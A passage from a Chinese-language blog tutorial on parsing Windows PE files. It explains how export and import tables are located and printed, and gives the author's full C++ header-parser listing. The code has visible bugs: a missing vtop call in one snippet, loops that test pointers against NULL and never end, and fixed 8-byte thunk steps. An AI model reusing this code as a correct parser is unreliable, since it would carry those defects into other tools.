alt="func_table"></p><p>所以才有打印时的循环操作：</p><ol><li>首先根据整体数量操作，打印出索引对应地址；</li><li>然后进入内层循环，找有名称的函数；</li><li>当地址索引和序数表内容相同时，也就是if判断，利用当前序数表索引打印函数名称；</li><li>设置的flag位算信号量，打印没名称函数；</li></ol><h2 id="打印导入表"><a href="#打印导入表" class="headerlink" title="打印导入表"></a>打印导入表</h2><h3 id="关于dll载入"><a href="#关于dll载入" class="headerlink" title="关于dll载入"></a>关于dll载入</h3><p>显式加载时，调用文件会留下函数名，以rva字符串形式保存在文件中；</p><p>主文件和dll文件被扔到同一个进程中；</p><p>加载到内存时，loadlibrary函数做了 将dll文件的 imagebase 地址赋予到本文件指针，所以<strong>可以操作dll文件的头部</strong>；</p><p>可以简单理解 通过dll的导出表 将存放函数名rva的地方改成了对应的函数地址；</p><p>由此，dll中的函数被调用；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获取导入表</span></span><br><span class="line"><span class="keyword">if</span> ((UINT32) * (UINT32*)(datadirarray + <span class="number">8</span>) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    UINT8* import_table = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(datadirarray + <span class="number">8</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">    <span class="keyword">while</span> (import_table != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        UINT8* original_first_thunk = import_table;</span><br><span class="line">        UINT32 itnamead = (UINT32) * (UINT32*)(import_table + <span class="number">12</span>);</span><br><span class="line">        UINT8* itname = (itnamead, p_section_header, number_of_sections) + fbuffer;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Import Table:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n\n&quot;</span>, itname);</span><br><span class="line"></span><br><span class="line">        UINT8* name_stru = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(original_first_thunk), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">        <span class="keyword">while</span> (name_stru != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            UINT32 ntype = (UINT32) * (UINT32*)name_stru;</span><br><span class="line">            <span class="keyword">if</span> (ntype &amp; <span class="number">0x80000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;import by ordinal %40d\n&quot;</span>, ntype &amp; <span class="number">0x7fffffff</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                UINT8* n_stru = <span class="built_in">vtop</span>(ntype, p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">                n_stru += <span class="number">2</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;import by name %40s\n&quot;</span>, n_stru);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            name_stru += <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;--------------------\n&quot;</span>);</span><br><span class="line">        import_table += <span class="number">0x14</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;no import..\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>导入表结构如下：</p><p><img src="https://s2.loli.net/2023/07/17/4m7Qy2cEWUjlYnb.png" alt="import"></p><p>先根据datadirarray拿到import表，每个导入的文件都会有一个import表，所以import表可能有多个，所以循环遍历；</p><p>在import表里有 IAT 和 INT ，这里拿的是 INT ： original_first_thunk，之后获取名称；</p><p>STRU在上述代码称为name_stru，是该导入表的所有函数，所以又用一个循环遍历；</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">     WORD Hint;         <span class="comment">// 该函数的导出序数</span></span><br><span class="line">     BYTE Name[<span class="number">1</span>];      <span class="comment">// 该函数的名字</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>INT里的每一个STRU会指向一个结构体： import by name，里面可能是序数导入的函数，也可能是名称导入的函数，区分就是看最高位是否是1，如果是名字导入，则第二个字节之后就是名称的rva；</p><p>在dll链接之后，根据dll自身的导出表中的函数地址，一一对应地修改自身exe文件的导入表中IAT指向，此时IAT便指向了真实的地址；</p><h2 id="整体效果"><a href="#整体效果" class="headerlink" title="整体效果"></a>整体效果</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> UINT8;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> UINT16;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> UINT32;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> UINT64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fapi = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//RVA转FOA</span></span><br><span class="line"><span class="function">UINT32 <span class="title">vtop</span><span class="params">(UINT32 rva, UINT8* p_section_header, UINT16 number_of_sections)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">UINT32 VA;</span><br><span class="line">UINT32 PA;</span><br><span class="line">UINT32 true_size;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; number_of_sections; i++)</span><br><span class="line">&#123;</span><br><span class="line">VA = (UINT32) * (UINT32*)(p_section_header + <span class="number">12</span>);</span><br><span class="line">PA = (UINT32) * (UINT32*)(p_section_header + <span class="number">20</span>);</span><br><span class="line">true_size = (UINT32) * (UINT32*)(p_section_header + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((rva &gt;= VA) &amp;&amp; (rva &lt; VA + true_size))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fapi == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> (rva - VA + PA - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (rva - VA + PA);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">p_section_header += <span class="number">0x28</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;rva error\n\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取文件长度</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_file_size</span><span class="params">(FILE* fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_END);</span><br><span class="line"><span class="keyword">int</span> size = <span class="built_in">ftell</span>(fp);</span><br><span class="line"><span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> mode[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nUsage: %s + ./file_you_want_know\n\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (argc &gt; <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(mode, <span class="string">&quot;%s&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//读文件</span></span><br><span class="line"><span class="keyword">char</span>* filename = argv[<span class="number">1</span>];</span><br><span class="line">FILE* fp;</span><br><span class="line"><span class="keyword">if</span> ((fp = <span class="built_in">fopen</span>(filename, <span class="string">&quot;r&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nfile path maybe wrong?\n\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fsize = <span class="built_in">get_file_size</span>(fp);</span><br><span class="line"></span><br><span class="line">UINT8* fbuffer = (UINT8*)<span class="built_in">malloc</span>(fsize);</span><br><span class="line"><span class="built_in">fread</span>(fbuffer, <span class="number">1</span>, fsize, fp);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fclose</span>(fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取dos头</span></span><br><span class="line">UINT8* p_dos_header = fbuffer;</span><br><span class="line"></span><br><span class="line">UINT16 dos_magic = (UINT16) * ((UINT16*)p_dos_header);</span><br><span class="line">UINT32 pe_offset;</span><br><span class="line"><span class="keyword">if</span> (dos_magic != <span class="number">0x5a4d</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n%s it&#x27;s not a valid PE file.\n\n&quot;</span>, filename);</span><br><span class="line"><span class="built_in">free</span>(fbuffer);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">pe_offset = (UINT32) * (UINT32*)(p_dos_header + <span class="number">0x40</span> - <span class="number">4</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取pe头</span></span><br><span class="line">UINT8* p_pe_header = (p_dos_header + pe_offset);</span><br><span class="line"></span><br><span class="line">UINT32 pe_magic = (UINT32) * ((UINT32*)p_pe_header);</span><br><span class="line"><span class="keyword">if</span> (pe_magic != <span class="number">0x4550</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((UINT32) * (UINT32*)(p_pe_header - <span class="number">1</span>) == <span class="number">0x4550</span>)</span><br><span class="line">p_pe_header -= <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n%s it&#x27;s pe magic number wrong: %x\n&quot;</span>, filename, pe_magic);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取file头</span></span><br><span class="line">UINT8* p_file_header = p_pe_header + <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">UINT16 machine_num = (UINT16) * ((UINT16*)p_file_header);</span><br><span class="line">UINT16 number_of_sections = (UINT16) * (UINT16*)(p_file_header + <span class="number">2</span>);</span><br><span class="line">UINT16 size_of_optional_header = (UINT16) * (UINT16*)(p_file_header + <span class="number">16</span>);</span><br><span class="line">UINT16 file_characteristics = (UINT16) * (UINT16*)(p_file_header + <span class="number">18</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nit&#x27;s machine number is %xh\n&quot;</span>, machine_num);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取可选头</span></span><br><span class="line">UINT8* p_optional_header = p_file_header + <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">UINT16 optional_magic = (UINT16) * ((UINT16*)p_optional_header);</span><br><span class="line">UINT32 oep_offset = (UINT32) * (UINT32*)(p_optional_header + <span class="number">16</span>);</span><br><span class="line">UINT64 image_base = (UINT64) * (UINT64*)(p_optional_header + <span class="number">24</span>);</span><br><span class="line">UINT32 section_alignment = (UINT32) * (UINT32*)(p_optional_header + <span class="number">32</span>);</span><br><span class="line">UINT32 file_alignment = (UINT32) * (UINT32*)(p_optional_header + <span class="number">36</span>);</span><br><span class="line">UINT32 size_of_image = (UINT32) * (UINT32*)(p_optional_header + <span class="number">56</span>);</span><br><span class="line">UINT32 size_of_headers = (UINT32) * (UINT32*)(p_optional_header + <span class="number">60</span>);</span><br><span class="line">UINT16 dll_characteristics = (UINT16) * (UINT16*)(p_optional_header + <span class="number">70</span>);</span><br><span class="line"><span class="keyword">if</span> (size_of_optional_header == <span class="number">0xe0</span> &amp;&amp; optional_magic == <span class="number">0x10b</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;standard 32bit mode.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (optional_magic == <span class="number">0x10b</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;32bit mode but size of optional header: %x\n&quot;</span>, size_of_optional_header);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (size_of_optional_header == <span class="number">0xf0</span> &amp;&amp; optional_magic == <span class="number">0x20b</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;standard 64bit mode.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (optional_magic == <span class="number">0x20b</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;64bit mode but size of optional header: %x\n&quot;</span>, size_of_optional_header);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OEP is at 0x%x\n\n&quot;</span>, image_base + oep_offset);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取节区头</span></span><br><span class="line">UINT8* p_section_header = p_optional_header + size_of_optional_header;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (*p_section_header == <span class="number">0</span>)</span><br><span class="line">p_section_header += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">char</span> section_name[<span class="number">9</span>];</span><br><span class="line">UINT32 VA;</span><br><span class="line">UINT32 PA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mode[<span class="number">0</span>] == <span class="number">45</span> &amp;&amp; mode[<span class="number">1</span>] == <span class="number">115</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; number_of_sections; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">section_name[j] = p_section_header[j];</span><br><span class="line">&#125;</span><br><span class="line">section_name[<span class="number">8</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">VA = (UINT32) * (UINT32*)(p_section_header + <span class="number">12</span>);</span><br><span class="line">PA = (UINT32) * (UINT32*)(p_section_header + <span class="number">20</span>);</span><br><span class="line">VA += image_base;</span><br><span class="line">PA += image_base;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%-40s VA 0x%016jx \n                                         PA 0x%016jx \n--------------------\n&quot;</span>, section_name, VA, PA);</span><br><span class="line">p_section_header += <span class="number">0x28</span>;</span><br><span class="line">&#125;</span><br><span class="line">p_section_header = p_optional_header + size_of_optional_header;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取datadirarray数组</span></span><br><span class="line">UINT32 datadirarray_index = (UINT32) * (UINT32*)(p_section_header - <span class="number">0x84</span>);</span><br><span class="line">UINT8* datadirarray = p_section_header - <span class="number">0x80</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((mode[<span class="number">0</span>] == <span class="number">45</span> &amp;&amp; mode[<span class="number">1</span>] == <span class="number">116</span>) || (mode[<span class="number">0</span>] == <span class="number">45</span> &amp;&amp; mode[<span class="number">2</span>] == <span class="number">116</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//获取导出表</span></span><br><span class="line"><span class="keyword">if</span> ((UINT32) * (UINT32*)(datadirarray) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">export_s:</span><br><span class="line">UINT8* export_table = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(datadirarray), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">UINT32 etnamead = (UINT32) * (UINT32*)(export_table + <span class="number">12</span>);</span><br><span class="line">UINT8* etname = <span class="built_in">vtop</span>(etnamead, p_section_header, number_of_sections) + fbuffer;</span><br><span class="line"><span class="keyword">if</span> (etname == fbuffer)</span><br><span class="line">&#123;</span><br><span class="line">fapi = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;correct already..\n\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> export_s;</span><br><span class="line">&#125;</span><br><span class="line">UINT32 number_of_functions = (UINT32) * (UINT32*)(export_table + <span class="number">20</span>);</span><br><span class="line">UINT32 number_of_names = (UINT32) * (UINT32*)(export_table + <span class="number">24</span>);</span><br><span class="line">UINT8* ad_of_funcs = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(export_table + <span class="number">28</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">UINT8* ad_of_names = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(export_table + <span class="number">32</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">UINT8* ad_of_ordis = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(export_table + <span class="number">36</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Export Table:\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n\n&quot;</span>, etname);</span><br><span class="line"><span class="keyword">int</span> flag;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; number_of_functions; i++)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%016jx&quot;</span>, (UINT32) * (UINT32*)(ad_of_funcs + <span class="number">4</span> * i) + image_base);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; number_of_names; j++)</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (i == (UINT16) * (UINT16*)(ad_of_ordis + <span class="number">2</span> * j))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;                    %3d     %s\n&quot;</span>, i, <span class="built_in">vtop</span>((UINT32) * (UINT32*)(ad_of_names + <span class="number">4</span> * j), p_section_header, number_of_sections) + fbuffer);</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;                            ---\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;no export..\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取导入表</span></span><br><span class="line"><span class="keyword">if</span> ((UINT32) * (UINT32*)(datadirarray + <span class="number">8</span>) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">UINT8* import_table = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(datadirarray + <span class="number">8</span>), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line"><span class="keyword">while</span> (import_table != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">UINT8* original_first_thunk = import_table;</span><br><span class="line">UINT32 itnamead = (UINT32) * (UINT32*)(import_table + <span class="number">12</span>);</span><br><span class="line">UINT8* itname = <span class="built_in">vtop</span>(itnamead, p_section_header, number_of_sections) + fbuffer;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Import Table:\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n\n&quot;</span>, itname);</span><br><span class="line"></span><br><span class="line">UINT8* name_stru = <span class="built_in">vtop</span>((UINT32) * (UINT32*)(original_first_thunk), p_section_header, number_of_sections) + fbuffer;</span><br><span class="line"><span class="keyword">while</span> (name_stru != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">UINT32 ntype = (UINT32) * (UINT32*)name_stru;</span><br><span class="line"><span class="keyword">if</span> (ntype &amp; <span class="number">0x80000000</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;import by ordinal %40d\n&quot;</span>, ntype &amp; <span class="number">0x7fffffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">UINT8* n_stru = <span class="built_in">vtop</span>(ntype, p_section_header, number_of_sections) + fbuffer;</span><br><span class="line">n_stru += <span class="number">2</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;import by name %40s\n&quot;</span>, n_stru);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">name_stru += <span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;--------------------\n&quot;</span>);</span><br><span class="line">import_table += <span class="number">0x14</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;no import..\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span 